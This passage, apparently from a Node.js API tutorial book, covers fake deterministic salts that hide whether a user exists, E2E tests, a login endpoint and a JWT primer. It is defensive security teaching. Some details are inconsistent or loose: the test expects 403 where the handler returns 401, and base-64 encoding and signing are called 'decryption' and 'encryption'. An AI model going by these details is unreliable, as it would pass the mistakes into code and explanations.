<pre>function injectHandlerDependencies(<br/>  handler, db, handlerToEngineMap, handlerToValidatorMap<strong>, ...remainingArguments</strong><br/>) {<br/>  const engine = handlerToEngineMap.get(handler);<br/>  const validator = handlerToValidatorMap.get(handler);<br/>  return (req, res) =&gt; { handler(req, res, db, engine, validator<strong>, ...remainingArguments</strong>); };<br/>}<br/><br/>export default injectHandlerDependencies;</pre>
<p>Now, when we run the E2E tests, they should all pass.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Generating a salt for non-existent users</h1>
                
            
            
                
<p>However, what happens when the client tries to get the salt of a non-existent user? At the moment, since we are not handling the case where Elasticsearch comes back with zero search results, our API will respond with a <kbd>500 Internal Server</kbd> error. But how <em>should</em> our API respond?</p>
<p>If we respond with a <kbd>404 Not Found</kbd> error, then anyone with an API testing tool such as Postman will be able to determine whether a user with that email has an account on our platform. Imagine if our platform is not a public user directory, but a customer portal for personal/medical services such as plastic surgery centers, fertility clinics, or law firms; it'd be embarrassing for the clients if someone found out that he/she is registered with the service simply by typing in his/her email and not getting a "User not found" message.</p>
<p class="mce-root">Whether the consequences are potentially embarrassing or not, it is generally a good practice to expose as little information as possible. This is an extension of the principle of least privilege, where a system should only expose the minimal amount of information for an entity to carry out its functions.</p>
<p>Therefore, returning a <kbd>404 Not Found</kbd> error is not appropriate.</p>
<p>So, what's the alternative? Since all our bcrypt salts have the same length (the sequence <kbd>$2a$10$</kbd> followed by 22 characters) and a valid character range, we can simply generate a new salt using <kbd>bcrypt.genSaltSync()</kbd> and return this as the salt. For example, we can define the following catch block at the end of our <kbd>getSalt</kbd> engine module:</p>
<pre>.catch(err =&gt; {<br/>  if (err.status === 404) {<br/>    return bcrypt.genSaltSync(10);<br/>  }<br/>  return Promise.reject(new Error('Internal Server Error'));<br/>});</pre>
<p>However, someone looking to exploit our API can send multiple requests, observe that each salt that is returned is different, and deduce that this is not a real user (because a user is likely to have the same salt within a short space of time). So, even though generating a new random string for non-existent users will slow down such an attacker, our API would still be leaking too much information.</p>
<p>Instead, we can use a <strong>pseudorandom number generator</strong> (a <strong>PRNG</strong>, which is a type of <strong>deterministic random bit generator</strong> (<strong>DRBG</strong>)). PRNGs generate a number sequence that appears to be random, but is actually determined based on an initial value (called the <strong>seed</strong>). Therefore, we can use the user's email address as the seed, and use it to generate a seemingly random number sequence, somehow transform it into a 22-character string, prepend the sequence with <kbd>$2a$10$</kbd>, and send it back to the client as the salt value for that user. This way, a persistent, non-changing salt is returned, regardless of whether the user exists or not.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Writing E2E tests</h1>
                
            
            
                
<p>So first, let's write a new scenario that'll test two things:</p>
<ul>
<li>When querying for the salt of a non-existent user (identified by email), it will return a string with the right character count and character range</li>
<li>When querying for the salt of the same non-existent user over multiple requests, the salt returned should be the same</li>
</ul>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Your feature file might look something like this:</p>
<pre>Scenario: Retrieve Salt of Non-Existent User<br/><br/> When the client creates a GET request to /salt<br/> And set "email=non@existent.email" as a query parameter<br/> And sends the request<br/> Then our API should respond with a 200 HTTP status code<br/> And the payload of the response should be a string<br/> And the response string should satisfy the regular expression /^\$2a\$10\$[a-zA-Z0-9\.\/]{22}$/<br/><br/>Scenario: Retrieve the same Salt of Non-Existent User over multiple requests<br/><br/> Given the client creates a GET request to /salt<br/> And set "email=non@existent.email" as a query parameter<br/> And sends the request<br/> And the payload of the response should be a string<br/> And saves the response text in the context under salt<br/><br/> When the client creates a GET request to /salt<br/> And set "email=non@existent.email" as a query parameter<br/> And sends the request<br/> And the payload of the response should be a string<br/> And the payload should be equal to context.salt</pre>
<p>You'd also need to define the following step definition:</p>
<pre>Then(/^the response string should satisfy the regular expression (.+)$/, function (regex) {<br/> const re = new RegExp(regex.trim().replace(/^\/|\/$/g, ''));<br/> assert.equal(re.test(this.responsePayload), true);<br/>});</pre>
<p>Run the tests and see them fail. Once you've done that, we are ready to implement the feature.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementation</h1>
                
            
            
                
<p>JavaScript's <kbd>Math.random()</kbd> does not provide an option to provide a seed, but there are libraries out there that implement a PRNG in JavaScript. Two of the most popular ones are <kbd>seedrandom</kbd> and <kbd>random-seed</kbd>. Out of the two, the <kbd>random-seed</kbd> package provides a <kbd>string(count)</kbd> method that'll generate a random string instead of a random number; because of this convenience, we will use the <kbd>random-seed</kbd> package to generate our fake salt.</p>
<p>First, let's install it:</p>
<pre><strong>$ yarn add random-seed</strong></pre>
<p>Now, create a new file at <kbd>utils/generate-fake-salt.js</kbd> and define a new <kbd>generateFakeSalt</kbd> function that will output a fake salt based on the email of the user:</p>
<pre>import randomseed from 'random-seed';<br/><br/>function generateFakeSalt(seed) {<br/>  const salt = randomseed<br/><br/>    // Seed the pseudo-random number generator with a seed so the <br/>    // output is deterministic<br/>    .create(seed)<br/><br/>    // Instead of a number, generate a string of sufficient length,<br/>    // so that even when invalid characters are stripped out,<br/>    // there will be enough characters to compose the salt<br/>    .string(110)<br/><br/>    // Replace all characters outside the character range of a valid    <br/>    //bcrypt salt<br/>    .replace(/[^a-zA-Z0-9./]/g, '')<br/><br/>    // Extract only the first 22 characters for the salt<br/>    .slice(0, 22);<br/><br/>  // Prepend the bcrypt algorithm version and cost parameters<br/>  return `$2a$10$${salt}`;<br/>}<br/><br/>export default generateFakeSalt;</pre>
<p>Next, inside the <kbd>retrieveSalt</kbd> engine, add a <kbd>catch</kbd> block at the end that will use the <kbd>generateFakeSalt</kbd> function if the user cannot be found:</p>
<pre>function retrieveSalt(req, db, getSalt<strong>, generateFakeSalt</strong>) {<br/>  ...<br/>    .then(bcrypt.getSalt)<br/>    <strong>.catch((err) =&gt; {</strong><br/><strong>      if (err.message === NO_RESULTS_ERROR_MESSAGE) {</strong><br/><strong>        return generateFakeSalt(req.query.email);</strong><br/><strong>      }</strong><br/><strong>      return Promise.reject(new Error('Internal Server Error'));</strong><br/><strong>    });</strong><br/>}</pre>
<p>Again, import the <kbd>generateFakeSalt</kbd> utility function in <kbd>src/index.js</kbd>, and pass it down to the engine through the handler.</p>
<p>Now, run the E2E test suite again and the tests should pass. Add some unit and integration tests to cover these new blocks of code. When you finish, commit the changes and move on to the next step.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Login</h1>
                
            
            
                
<p>The client is now able to do the following:</p>
<ul>
<li>Specify a password digest when creating a new user</li>
<li>Query for the digest salt</li>
</ul>
<p>This means that the client can now use the same salt and password combination to regenerate the exact same hash that it provided when creating the user.</p>
<p>This means that when the client wants to perform an action that requires authorization (such as updating its own profile), it can send its email and the digest to the API server, and our server will try to match them with the database records; if there's a match, the user is authenticated and the action is allowed to go ahead, otherwise, an error response is returned.</p>
<p class="mce-root">While globally carrying out this authentication process on each request would work, it is not ideal for the following reasons:</p>
<ul>
<li class="mce-root">The client would have to store the credentials locally. If this is done improperly (for example, as a cookie that has not been marked as secure), then other programs may be able to read it.</li>
<li>The server would need to query the database on each request, which is a slow operation. Furthermore, it could overload the database if the API is receiving heavy traffic, making it a performance bottleneck.</li>
</ul>
<p>Therefore, instead of providing the full set of credentials with every request that requires authorization, we should implement a Login endpoint, where our users are able to provide their password just once. After successfully authenticating themselves with the Login endpoint, the API would respond with some kind of identifier, which the client can attach to subsequent requests to identify themselves. Let's implement our Login endpoint now, and we will deal with what this identifier actually is shortly after.</p>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Writing tests</h1>
                
            
            
                
<p>First, we begin our development by writing tests. Since the validation logic of the Login endpoint works in the same way as our endpoints, we can simply copy those scenarios from our other tests:</p>
<pre>Feature: Login User<br/><br/>  Test that we can create a user using a digest and then perform a login that returns successfully<br/><br/>  Background: Create User with email and password digest<br/><br/>    Given 1 new user is created with random password and email<br/><br/>  Scenario Outline: Bad Client Requests<br/>    ...<br/>  Scenario Outline: Bad Request Payload<br/>    ...<br/>  Scenario Outline: Request Payload with Properties of Unsupported Type<br/>    ...<br/>  Scenario Outline: Request Payload with invalid email format<br/>    ...<br/>  Scenario Outline: Request Payload with invalid digest format<br/>    ...</pre>
<p>Next, we can specify scenarios specific to the Login endpoint:</p>
<pre>  Scenario: Login without supplying credentials<br/>    When the client creates a POST request to /login<br/>    And sends the request<br/>    Then our API should respond with a 400 HTTP status code<br/><br/>  Scenario: Login attaching a well-formed payload<br/><br/>    When the client creates a POST request to /login<br/>    And attaches a valid Login payload<br/>    And sends the request<br/>    Then our API should respond with a 200 HTTP status code<br/>    And the payload of the response should be a string<br/><br/>  Scenario Outline: Login attaching a well-formed payload but invalid credentials<br/><br/>    When the client creates a POST request to /login<br/>    And attaches a Login payload where the &lt;field&gt; field is exactly &lt;value&gt;<br/>    And sends the request<br/>    Then our API should respond with a 403 HTTP status code<br/><br/>    Examples:<br/><br/>    | field  | value                                                        |<br/>    | email  | non@existent.email                                           |<br/>    | digest | $2a$10$enCaroMp4gMvEmvCe4EuP.0d5FZ6yc0yUuSJ0pQTt4EO5MXvonUTm |</pre>
<p>In the second scenario (<kbd>Login attaching a well-formed payload</kbd>), the response body should be an identification object. However, before we decide on how to implement this object, we can simply test that a string is returned.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementing Login</h1>
                
            
            
                
<p>As before, let's implement the Login engine first. Like our other engines, we are first using a validator to validate the request object. Once the request is validated, we then use the Elasticsearch client's <kbd>search</kbd> method to see how many user documents match the email and digest provided. If there are non-zero documents, then a user with these credentials exists, and the engine should resolve with a token (we are using a placeholder string for now). If there are no users that match these credentials, it means that those credentials are invalid, and the engine should return with a rejected promise:</p>
<pre>import specialEscape from 'special-escape';<br/><br/>const specialChars = ['+', '-', '=', '&amp;&amp;', '||', '&gt;', '&lt;', '!', '(', ')', '{', '}', '[', ']', '^', '"', '~', '*', '?', ':', '\\', '/'];<br/><br/>function loginUser(req, db, validator, ValidationError) {<br/>  const validationResults = validator(req);<br/>  if (validationResults instanceof ValidationError) {<br/>    return Promise.reject(validationResults);<br/>  }<br/>  return db.search({<br/>    index: process.env.ELASTICSEARCH_INDEX,<br/>    type: 'user',<br/>    q: `(email:${specialEscape(req.body.email, specialChars)}) AND (digest:${specialEscape(req.body.digest, specialChars)})`,<br/>    defaultOperator: 'AND',<br/>  }).then((res) =&gt; {<br/>    if (res.hits.total &gt; 0) {<br/>      return 'IDENTIFIER';<br/>    }<br/>    return Promise.reject(new Error('Not Found'));<br/>  });<br/>}<br/><br/>export default loginUser;</pre>
<p>When searching in Elasticsearch, there are certain characters that must be escaped. We are using the <kbd>special-escape</kbd> npm package to escape our email and bcrypt digest before passing it to Elasticsearch. Therefore, we must add this package to our repository:</p>
<pre><strong>$ yarn add special-escape</strong></pre>
<p>Next, we move on to the request handler. Create a new file at <kbd>src/handlers/auth/loginindex.js</kbd> with the following function:</p>
<pre>function login(req, res, db, engine, validator, ValidationError) {<br/>  return engine(req, db, validator, ValidationError)<br/>    .then((result) =&gt; {<br/>      res.status(200);<br/>      res.set('Content-Type', 'text/plain');<br/>      return res.send(result);<br/>    })<br/>    .catch((err) =&gt; {<br/>      res.set('Content-Type', 'application/json');<br/>      if (err instanceof ValidationError) {<br/>        res.status(400);<br/>        return res.json({ message: err.message });<br/>      }<br/>      if (err.message === 'Not Found') {<br/>        res.status(401);<br/>        return res.json({ message: 'There are no records of an user with this email and password combination' });<br/>      }<br/>      res.status(500);<br/>      return res.json({ message: 'Internal Server Error' });<br/>    });<br/>}<br/><br/>export default login;</pre>
<p>Then, we need to define a validator for the Login endpoint payload. Fortunately for us, the Login payload has the same structure as the Create User payload, and so we can simply reuse the Create User validator. However, to make it explicit, let's create a file at <kbd>src/validators/auth/login.js</kbd> with the following two lines:</p>
<pre>import validate from '../users/create';<br/>export default validate;</pre>
<p>Lastly, import the handler, engine, and validator in <kbd>src/index.js</kbd> and define a new route:</p>
<pre><strong>import loginValidator from './validators/auth/login';</strong><br/><strong>import loginHandler from './handlers/auth/login';</strong><br/><strong>import loginEngine from './engines/auth/login';</strong><br/>const handlerToEngineMap = new Map([<br/>  <strong>[loginHandler, loginEngine],</strong><br/>  ...<br/>]);<br/>const handlerToValidatorMap = new Map([<br/>  <strong>[loginHandler, loginValidator],</strong><br/>]);<br/><strong>app.post('/login', injectHandlerDependencies(<br/>  loginHandler, client, handlerToEngineMap, handlerToValidatorMap, ValidationError,<br/>));</strong></pre>
<p class="mce-root">Now, run the E2E tests again and they should be green.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Keeping users authenticated</h1>
                
            
            
                
<p class="mce-root">Now that our API server can authenticate users, what identifier should we return to the client so they can attach it in subsequent requests? Generally, there are two types of identifiers:</p>
<ul>
<li class="mce-root"><strong>Sessions IDs</strong>: After the client has successfully authenticated, the server assigns this client a session ID, stores the session ID in the database, and returns it to the client. This session ID is simply a long, randomly generated text that is used to identify the user's session. When the client sends a request and supplies the session ID, the server searches its database for a user with that <strong>session</strong>, and assumes that the client is the user associated with that session ID. The idea is that because the string is long and random enough that no one would be able to guess a valid session ID, it's also long enough that someone is unlikely to be able to duplicate that session ID.</li>
</ul>
<ul>
<li class="mce-root"><strong>Claims (tokens)</strong>: After the client has successfully authenticated, the server retrieves information that can identify the user (for example, their ID, username, or email). If the system also supports different levels of permissions (for example, edit profile and delete profile) or roles (such as admin, moderator, and user), these should also be retrieved.<br/>
All this information, called <strong>claims</strong> (or a <strong>claim set</strong><em>,</em> if there are more than one), is formatted into a standardized format and signed using a key, producing a <strong>token</strong>. This token is then sent back to the client, which attaches it to every request that requires authentication. When the server receives a request with a token, it will use the key to verify that the token originated from the API server and has not been altered. Once a token is verified, the server can trust the claims presented by the token.</li>
</ul>
<p>We will use tokens over session IDs because of the following factors:</p>
<ul>
<li><strong>Stateless</strong>: With session IDs, the server still needs to perform database reads in order to ascertain the identity and permission levels of a user, as well as if the session has expired. With tokens, all the information is contained in the claims of the token; the server does not need to store the token anywhere and it can be verified without interaction with the database.</li>
<li><strong>Reduced server load:</strong> As an extension of being stateless, the server would save a lot of memory and CPU cycles that would have gone into database reads. Furthermore, if the user wishes to log out of the session, all they need to do is delete the token. No actions are required on the server.</li>
<li><strong>Scalability:</strong> With session-based authentication, if the user logs in on one server, the session ID saved in the database on that server may not replicate quickly enough so that if a subsequent request was routed to a different server, that server would not be able to authenticate that user. But because tokens are self-contained, they include all of the information required to identify <em>and</em> authenticate a user. The user would be authenticated on any server that has the decryption key.</li>
<li><strong>Information-rich</strong>: A token can carry much more information than a session ID can. With a session ID, the server would need to read the database and possibly process the user data in order to determine whether the request should be carried out.</li>
</ul>
<p class="mce-root"/>
<ul>
<li><strong>Portable/transferable</strong>: Any party that has the token has permission to perform actions that the token allows, and tokens can be passed freely from one party to another. This is useful when a user wishes to grant a third-party platform limited access to their account. Without a token, they must give the third party their ID and password, and hope that they don't do anything malicious. With a token, the user, once authenticated, can request a token with a certain set of permissions, after which he/she can send it to the third party. Now, the third-party can perform the actions it says it will perform, without knowing the user's actual credentials.</li>
<li><strong>More secure</strong>: A session ID's security depends on its implementation. If the session ID can be easily guessed (for example, it's a simple incremental counter) then a malicious party can guess the session ID and hijack a legitimate user's session. With a token, the malicious party must know the key used to sign the token in order to create a valid token.</li>
</ul>
<p>Therefore, using a token as a means of conveying user authentication information is preferred. But since a token is simply a set of claims in a specific format signed using a key, there are many standards available. Luckily, <strong>JSON Web Tokens</strong> (<strong>JWTs</strong>, pronounced "jots") have become the <em>de facto</em> standard for tokens, so the choice is a no-brainer. They are also formally defined in RFC7519 (<a href="https://tools.ietf.org/html/rfc751">tools.ietf.org/html/rfc751</a>). We will use JWTs as the format for representing our claims in this project.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">JSON web tokens (JWTs)</h1>
                
            
            
                
<p class="mce-root">Generally, a token is a string issued by a server, which allows the owner of the token to perform specific actions on the server, for a specific period of time. A JWT is a standard of token that "<em>safely</em> passes <em>claims</em> in space-constrained environments."</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Anatomy of a JWT</h1>
                
            
            
                
<p class="mce-root">A JWT is composed of three parts, separated by a period (<kbd>.</kbd>):</p>
<pre class="mce-root">&lt;header&gt;.&lt;payload&gt;.&lt;signature&gt;</pre>
<ul>
<li class="mce-root"><strong>Header</strong>: a JSON object that contains information about the token, such as its type and the algorithm used to produce the signature, for example, <kbd>{ "alg": "HS512", "typ": "JWT" }</kbd>.</li>
<li class="mce-root"><strong>Payload</strong>: A JSON object contains a set of claims, such as its identity and permissions, for example, <kbd>{ "sub": "e@ma.il" }</kbd>.</li>
</ul>
<p class="mce-root"/>
<ul>
<li class="mce-root"><strong>Signature</strong>: A string that is either a <strong>Message Authentication Code</strong> (<strong>MAC</strong>) or <strong>digital signature</strong>. The purpose of the signature is to ensure the <em>authenticity</em> and <em>integrity</em> of the payload.</li>
</ul>
<p>The header and payload are then base-64 encoded to ensure they are compact. A simple JWT may look like this (new lines have been inserted for readability):</p>
<pre>eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9<br/>.<br/>eyJzdWIiOiJlQG1hLmlsIn0<br/>.<br/>m5ZdZVXkUvur6kYndOAtp3nFdhGSqiK5S13s53y0N5EJukYE1pWdaSOY_a3lZEOsDSJ5xsUw5ACxG8VyCWUleQ</pre>
<p class="mce-root">When the header and payload are base-64 decrypted, their information is once again revealed:</p>
<pre class="mce-root">{ "alg": "HS512", "typ": "JWT" }  # Header<br/>{ "sub": "e@ma.il" }              # Payload</pre>
<p>Because JWTs are base-64 encoded, they are URL-safe. This means a JWT can be supplied through the URL, in the body of an HTTP request, or as a value inside an HTTP <kbd>Authorization</kbd> header.</p>
<p>Now, let's examine each part of the JWT in more details, starting with the header.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Header</h1>
                
            
            
                
<p class="mce-root">The <strong>Javascript Object Signing and Encryption</strong> (<strong>JOSE</strong>) header is a JSON object that provides information on a token's type, method of construction, and any metadata. The keys to the JOSE header have a special meaning:</p>
<ul>
<li class="mce-root"><kbd>typ</kbd>: The media type of the JWT. It is recommended to use a value of <kbd>"JWT"</kbd>.</li>
<li class="mce-root"><kbd>cty</kbd>: The content type of the JWT. This header should only be used in the case of nested JWT, and its value must be <kbd>"JWT"</kbd> to indicate that the content of the outermost JWT is also a JWT.</li>
<li class="mce-root"><kbd>alg</kbd>: The algorithm used to generate the signature.</li>
</ul>
<p>There are additional headers that are available depending on whether the JWT is a <strong>JSON Web Signature</strong> (<strong>JWS</strong>) or <strong>JSON Web Encryption</strong> (<strong>JWE</strong>). You can find the full list of headers at <a href="http://www.iana.org/assignments/jose/jose.xhtml">iana.org/assignments/jose/jose.xhtml</a>.</p>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Payload and claims</h1>
                
            
            
                
<p class="mce-root">The payload of a JWT consists of one or more claims. There are three classes of claims in JWT: registered, public, and private.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Registered claim names</h1>
                
            
            
                
<p class="mce-root"><strong>Registered claim names</strong> are reserved claim names that have special meanings. They are defined in the JWT specification and can be found on the <strong>Internet Assigned Numbers Authority</strong> (<strong>IANA</strong>) <em>JSON Web Token Claims</em> registry. Although these names are reserved and have a special meaning, the way the server processes these claims is completely up to the servers itself. All registered claims are optional:</p>
<ul>
<li class="mce-root"><kbd>iss</kbd>: Issuer: The principal that issued the JWT. In our case, this would be something like <kbd>hobnob</kbd>.</li>
<li class="mce-root"><kbd>sub</kbd>: Subject: The entity that the claims apply to. In our case, this would be the user's email or ID.</li>
<li class="mce-root"><kbd>aud</kbd>: Audience: A list of all principals that are intended to process the JWT. If the principal processing the claim does not identify itself with a value in the <kbd>aud</kbd> claim when this claim is present, then the JWT <em>must</em> be rejected.</li>
<li class="mce-root"><kbd>exp</kbd>: Expiration Time: The time, in UNIX timestamp (seconds), on or after which the JWT must be considered as invalid. However, the server may provide some leniency (up to a few minutes) to account for cases where server clocks are not synchronized.</li>
<li class="mce-root"><kbd>nbf</kbd>: Not Before: The time, in UNIX timestamp (seconds), before which the JWT must be considered invalid.</li>
<li class="mce-root"><kbd>iat</kbd>: Issued At: The time, in UNIX timestamp (seconds), at which the JWT was issued.</li>
<li class="mce-root"><kbd>jti</kbd>: JWT ID: A unique identifier for the JWT. It can be used to prevent replay attacks if the JWT is meant to be used as a <strong>nonce</strong> (that is, a <strong>one-time token</strong>). It can also be used to revoke tokens.</li>
</ul>
<p>Claim names are short to minimize the overall size of the JWT, as a JWT needs to be included in every request that requires authentication/authorization.</p>
<p class="mce-root"/>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Public claim names</h1>
                
            
            
                
<p class="mce-root">Anyone may define their own claim names as long as they don't clash with the registered claim names. These claim names may be called <strong>public claim names</strong> if reasonable precautions have been made to ensure that the name will not clash with other claim names. Such precautions may include using namespaces that the issuer controls, such as domain names.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Private claim names</h1>
                
            
            
                
<p class="mce-root">A <strong>private claim name</strong> is a user-defined claim name that's agreed upon between the producer and consumer of the JWT. No effort is made to prevent a naming collision, and so private claim names should be used with caution.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Example claim</h1>
                
            
            
                
<p class="mce-root">For example, if our server wishes to grant a user with the email <kbd>e@ma.il</kbd> permission to delete its own profile for one day (25 October 2017), then we may issue a JWT with a payload that looks like this:</p>
<pre class="mce-root">{<br/>  "jti": "a8f0c4e8e",<br/>  "iss": "hobnob.social",<br/>  "sub": "e@ma.il",<br/>  "nbf": 1508886000,<br/>  "exp": 1508972400,<br/>  "iat": 1508274036,<br/>  "social.hobnob.permissions": {<br/>    "profile": {<br/>      "delete": ["e@ma.il"]<br/>    }<br/>  }<br/>}</pre>
<p>The <kbd>iss</kbd>, <kbd>sub</kbd>, and <kbd>aud</kbd> claims must be of type <kbd>StringOrURI</kbd>. This means that they can be any arbitrary string, but if they include a colon (<kbd>:</kbd>), they must be a valid URI.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Signature</h1>
                
            
            
                
<p class="mce-root">Once we have a list of claims, or assertions, written inside the token, we must sign it. This is because anyone can create a token with those claims, or even tokens with different claims! We don't want to honor these tokens; we only want to honor tokens that are generated by our own servers (are <em>authentic</em>) and have not been tampered with (have <em>integrity</em>). We can do this by first attaching a JWS signature to the token, and then validating it when the token is processed.</p>
<p>A <strong>digital signature</strong> is different from a <strong>JWS signature</strong>, as a JWS signature may also include Message Authentication Codes (MACs). When talking about JWTs, the term "signature" or "signing a token" usually refers to a JWS signature, not specifically a digital signature.</p>
<p class="mce-root">The supported algorithms for signing tokens are defined in the <strong>JSON Web Algorithms</strong> (<strong>JWA</strong>) specification. Generally, there are two types of algorithms used for signing a token:</p>
<ul>
<li class="mce-root"><strong>Asymmetrically</strong>, using a pair of <strong>public/private keys</strong> (for example, <strong>RS256</strong>, <strong>RS384</strong>, and <strong>RS512</strong>)</li>
<li class="mce-root"><strong>Symmetrically</strong>, using a <strong>secret</strong> (for example, <strong>HS256</strong>, <strong>HS384</strong>, and <strong>HS512</strong>)</li>
</ul>
<p class="mce-root">Regardless of which algorithm is chosen, the base-64 encoded header and payload are first concatenated together, separated by a period (<kbd>.</kbd>). This combined string (<kbd>[base64Header].[base64Payload]</kbd>) is then passed into the algorithm to generate the JWS signature:</p>
<pre>const header = {<br/>  alg: [algorithm],<br/>  typ: "JWT"<br/>}<br/><br/>const payload = {<br/>  admin: true<br/>}<br/><br/>const base64Header = btoa(header);<br/>const base64Payload = btoa(payload);<br/><br/>const jwsSignature = alg(`${base64Header}.${base64Payload}`, [k])</pre>
<p class="mce-root">Here, <kbd>k</kbd> is the secret or private key required for the algorithm. This is <em>always</em> kept private.</p>
<p class="mce-root">This JWS signature is then concatenated to the end of the header/payload to generate the complete JWT, which has the format <kbd>[base64Header].[base64Payload].[base64JwsSignature]</kbd>.</p>
<p class="mce-root">When our server receives this JWT, it will regenerate a new JWS signature from the header and payload values, as well as the secret key, and compare it with the signature attached to the token. If there is a match, then our server can be confident that whoever produced the token had access to our secret key. Since our key is secret, then our server can be confident that we are the ones that issued the token, and can trust the claims made by the token. However, if there is a mismatch, it means that the token has either been signed with a different key, or has been tampered with, and should not be trusted.</p>
<p class="mce-root">Now, we understand <em>why</em> we need to sign the token (to ensure authenticity and integrity), so let's take a look at the difference between the two types of signing algorithms.</p>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Asymmetric signature generation</h1>
                
            
            
                
<p class="mce-root">Asymmetric signature generation utilizes a pair of mathematically-related public and private keys. They are related so that information encrypted by one key can only be decrypted using the other key.</p>
<p class="mce-root">In the context of JWTs, you can encrypt the header/claim set using the private key to produce a <em>digital signature</em>, which gets attached to the base-64 encoded header/claim set to produce a complete JWT. We would also make the public key public so consumers of the JWT can decrypt it.</p>
<p class="mce-root">Since the public key can be publicly shared, the issuer (who generates the JWT) and the consumer of the token (who validates it) can be different entities, as they don't need to share the same key.</p>
<p class="mce-root">Examples of asymmetric signature generation algorithms include the following:</p>
<p class="mce-root"/>
<ul>
<li class="mce-root">The <strong>Rivest–Shamir–Adleman</strong> (<strong>RSA</strong>) family, which uses the SHA hash algorithm, and includes RS256, RS384, and RS512</li>
<li class="mce-root">The <strong>Elliptic Curve Digital Signature Algorithm</strong> (<strong>ECDSA</strong>) uses the <strong>P-256/P-384/P-521</strong> curve and SHA hash algorithm, and include <strong>ES256,</strong> <strong>ES384</strong>, and <strong>ES512</strong></li>
</ul>


            

            
        
    

        

                            
                    <h1 class="header-title">Symmetric signature generation</h1>
                
            
            
                
<p class="mce-root">With symmetric signature generation algorithms, both generation and validation of the JWT require the same <em>secret</em>. Similar to before, we pass the base-64 encoded header/claim set into the algorithm with the secret, and a <strong>Message Authentication Code</strong> (<strong>MAC</strong>) is produced. The MAC is attached with the claim set and header to produce the full JWT.</p>
<p class="mce-root">Examples of symmetric signature generation algorithms include the <em>Keyed-hash message authentication code (HMAC) with the SHA</em> hash algorithm, and includes HS256, HS384, and HS512.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Picking an algorithm</h1>
                
            
            
                
<p class="mce-root">If our token is intended to be read by third parties, then an asymmetric signature generation algorithm makes sense. This is because, on top of providing authenticity and integrity, it asymmetric signature generation also provides the property of <strong>non-repudiation</strong> where the issuer of the JWT cannot deny (or repudiate) that they issued the token.</p>
<p>With an asymmetric signature, only our server would have access to the private key; this provides consumers of the JWT with confidence that the token was issued by our server and nobody else. If we instead use symmetric signature generation, we must securely share the secret with third party consumers so that they can decrypt the token. But it also means the third-parties can use that secret to generate more tokens. Thus, consumers of those JWTs would not have confidence as to the real issuer of the token:</p>
<table border="1" style="border-collapse: collapse;width: 100%">
<tbody>
<tr>
<td>Cryptographic primitive</td>
<td>Integrity</td>
<td>Authentication</td>
<td>Non-repudiation</td>
<td>Keys required</td>
</tr>
<tr>
<td>Hash</td>
<td>Yes</td>
<td>No</td>
<td>No</td>
<td>None</td>
</tr>
<tr>
<td>Digital signature</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes</td>
<td>Asymmetric keys</td>
</tr>
<tr>
<td>MAC</td>
<td>Yes</td>
<td>Yes</td>
<td>No</td>
<td>Shared symmetric secret key</td>
</tr>
</tbody>
</table>
<p> </p>
<p class="mce-root">However, in our use case, both the producer and consumer of the JWT are the same entity (our API server); therefore, both types of algorithms can be used.</p>
<p class="mce-root">MACs are computationally easier to generate than digital signatures, and the key size is also smaller for MACs; however, since asymmetric signature generation provides more flexibility if we potentially want to allow third parties to decrypt our tokens, we will go with the asymmetric algorithms.</p>
<p>Technically, ES512 would be the ideal choice, as we can use a shorter key while maintaining the same level of security. Because of this, ECDSA also uses fewer resources to compute than RSA:</p>
<table border="1" style="border-collapse: collapse;width: 100%">
<tbody>
<tr>
<th>Symmetric Key Length (AES)</th>
<th>Standard asymmetric Key Length (RSA)</th>
<th>Elliptic Curve Key Length (ECDSA)</th>
</tr>
<tr>
<td>80</td>
<td>1024</td>
<td>160</td>
</tr>
<tr>
<td>112</td>
<td>2048</td>
<td>224</td>
</tr>
<tr>
<td>128</td>
<td>3072</td>
<td>256</td>
</tr>
<tr>
<td>192</td>
<td>7680</td>
<td>384</td>
</tr>
<tr>
<td>256</td>
<td>15360</td>
<td>512</td>
</tr>
</tbody>
</table>
<p> </p>
<p class="mce-root">However, as ECDSA is still a relatively new set of algorithms, it does not receive as much support from tools as the more established algorithms, such as RSA. Therefore, we will use RSA with a key size of 4,096.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">A note on encryption</h1>
                
            
            
                
<p class="mce-root">At the moment, the header and payload are only base-64 encoded, which means anyone can decode them and read their content. This also means that if we include any sensitive information in the payload, anyone can read it. Ideally, we should ensure that the JWT carries as little sensitive information as possible, just enough for the consumer of the JWT to identify and grant permissions to the user. For our use case, we will include only the user ID in the payload, which we'll be treating as public information anyway, and so encrypting our token does not bring much value.</p>
<p>However, it's important to understand that a JWT can be encrypted.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Terminology and summary</h1>
                
            
            
                
<p>The preceding sections introduced a lot of new terms, which can be overwhelming. Therefore, before we move forward, let's quickly review and expand on some of the terminology used.</p>
<p class="mce-root">A <em>claim</em> is made up of a key-value pair of a <em>claim name</em> and <em>claim value</em>. A group of claims represented as a JSON object is a <em>claim set</em>; individual claims within a claim set may also be referred to as <em>members</em> of a claim set.</p>
<p class="mce-root">A <em>JSON Web Token</em> (JWT) is a string that includes the <em>JOSE Header</em> and the claim set, and is signed and (optionally) encrypted.</p>
